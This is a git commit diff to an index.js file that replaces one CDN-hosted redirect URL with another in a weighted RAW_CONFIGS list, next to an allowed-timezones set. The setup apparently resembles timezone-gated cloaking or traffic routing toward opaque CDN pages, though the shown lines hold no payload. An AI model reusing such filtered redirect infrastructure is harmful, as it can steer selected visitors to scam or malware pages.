f016597a237555b5fb0c960bcbeb9a075b54fca3
paalakash <palaksh452@gmail.com>
2026-06-29 11:58:28 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://std21.b-cdn.net/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://makers23.b-cdn.net/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
